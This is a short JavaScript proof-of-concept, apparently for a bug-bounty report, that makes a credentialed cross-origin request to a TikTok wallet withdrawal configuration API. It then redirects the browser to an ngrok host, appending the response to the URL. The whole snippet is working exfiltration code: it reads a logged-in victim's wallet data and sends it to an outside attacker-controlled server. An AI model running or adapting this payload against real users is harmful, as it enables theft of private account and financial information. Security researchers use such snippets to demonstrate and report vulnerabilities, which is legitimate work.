var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://webcast.us.tiktokv.com/webcast/wallet_api_tiktok/withdraw/preference_config/?aid=1284&account_type=102");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
